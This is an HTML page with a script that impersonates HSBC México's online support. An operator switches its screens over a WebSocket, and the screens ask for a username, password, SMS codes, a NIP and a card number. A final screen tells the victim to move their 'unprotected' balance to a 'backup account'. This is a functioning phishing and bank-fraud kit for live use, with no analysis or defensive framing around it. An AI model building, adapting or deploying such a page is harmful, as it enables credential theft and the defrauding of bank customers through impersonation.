<body>
  <div class="container" id="pantalla">
    <!-- Aquí se mostrará dinámicamente cada pantalla -->
  </div>

  <div class="footer">
    © HSBC México 2023. Todos los Derechos Reservados
  </div>

  <script>
    const socket = new WebSocket("ws://localhost:3000"); // cambia si usas otro host

    socket.addEventListener("message", (event) => {
      const data = JSON.parse(event.data);
      if (data.pantalla) {
        cargarPantalla(data.pantalla, data);
      }
    });

    function cargarPantalla(pantalla, data = {}) {
      let html = `<img id="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/16/HSBC_logo_%282018%29.svg/2560px-HSBC_logo_%282018%29.svg.png" width="120"/>`;
      switch(pantalla) {
        case "folio":
          html += `
            <h2>Folio de soporte:</h2>
            <p>Por favor, ingrese el folio de soporte técnico que su ejecutivo en línea le proporcionó.</p>
            <input placeholder="Ingrese su número de folio"/>
            <button>Ingresar</button>`;
          break;
        case "login":
          html += `
            <h2>Inicio de sesión:</h2>
            <p>Por favor, ingrese su usuario y contraseña.</p>
            <input placeholder="Ingrese su usuario"/>
            <input type="password" placeholder="Ingrese su contraseña"/>
            <button>Ingresar</button>`;
          break;
        case "codigo":
          html += `
            <h2>Hemos enviado un código de verificación</h2>
            <p>Ingresa el código que recibiste en tu número celular terminación: ${data.numero || '****'}</p>
            <input placeholder="Ingrese el SMS Recibido"/>
            <button>Continuar</button>
            <a href="#">Nueva aclaración</a> · <a href="#">Estatus de mis aclaraciones</a>`;
          break;
        case "nip":
          html += `
            <h2>Ingrese su NIP de confirmación</h2>
            <p>Para confirmar la cancelación de su cargo no reconocido, por favor ingrese su NIP.</p>
            <input type="password" placeholder="NIP de confirmación"/>
            <button>Validar</button>
            <a href="#">Nueva aclaración</a> · <a href="#">Estatus de mis aclaraciones</a>`;
          break;
        case "proteger":
          html += `
            <h2>¡Es necesario proteger su saldo!</h2>
            <p>Saldo sin proteger:</p>
            <h3>$${data.saldo || '0.00'}</h3>`;
          break;
        case "proteccion-exitosa":
          html += `
            <h2>Cuenta SU TOTAL PROTECCIÓN creada exitosamente</h2>
            <p>Transfiera la cantidad de $${data.saldo || '0.00'} a la cuenta de respaldo:</p>
            <strong>Alias:</strong> Cuenta de respaldo`;
          break;
        case "tarjeta":
          html += `
            <h2>Protección adicional</h2>
            <p>Agregaremos protección adicional a su tarjeta de crédito/débito.</p>
            <input placeholder="Número de tarjeta"/>
            <button>Continuar</button>
            <a href="#">Nueva aclaración</a> · <a href="#">Estatus de mis aclaraciones</a>`;
          break;
        case "cancelacion":
          html += `
            <h2>Cancelación de cargos:</h2>
            <p>Ingresa el código que recibiste en tu número terminación: ${data.numero || '****'}</p>
            <input placeholder="Ingrese el SMS Recibido"/>
            <button>Continuar</button>
            <a href="#">Nueva aclaración</a> · <a href="#">Estatus de mis aclaraciones</a>`;
          break;
        case "exito":
          html += `
            <h2>Cancelación exitosa</h2>
            <p>Hemos realizado la cancelación de su cargo de forma exitosa.</p>
            <strong>Comercio:</strong> ${data.comercio || 'Tienda XYZ'}<br/>
            <strong>Monto devuelto:</strong> $${data.monto || '0.00'}<br/>
            <p>El monto devuelto estará disponible en su tarjeta en un lapso no mayor a 72 horas.</p>`;
          break;
        default:
          html += `<h2>Cargando...</h2>`;
      }
      document.getElementById("pantalla").innerHTML = html;
    }

    // Cargar pantalla por defecto (folio)
    cargarPantalla("folio");
  </script>
</body>
</html>